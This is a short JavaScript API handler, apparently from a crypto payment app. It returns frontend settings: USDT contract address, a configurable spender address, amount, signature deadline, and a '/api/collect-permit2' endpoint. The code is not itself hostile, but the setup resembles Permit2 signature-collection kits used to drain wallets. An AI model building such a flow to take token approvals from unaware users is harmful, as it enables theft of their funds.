import { getSupabase, getSettings, cors } from '../lib/supabase.js';

/** Public frontend config – never returns private key or admin password */
export default async function handler(req, res) {
  cors(res);
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'GET') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const supabase = getSupabase();
    const s = await getSettings(supabase);

    return res.status(200).json({
      projectId: s.project_id || '',
      metadata: {
        name: s.metadata_name || 'Payment App',
        description: s.metadata_description || '',
        url: s.metadata_url || '',
        icons: s.metadata_icon ? [s.metadata_icon] : []
      },
      chainId: s.chain_id || 1,
      usdtAddress: s.usdt_address || '0xdAC17F958D2ee523a2206206994597C13D831ec7',
      spenderAddress: s.spender_address || '',
      amount: s.amount || '10000000',
      deadlineSeconds: s.deadline_seconds || 3600,
      backendEndpoint: '/api/collect-permit2'
    });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
}
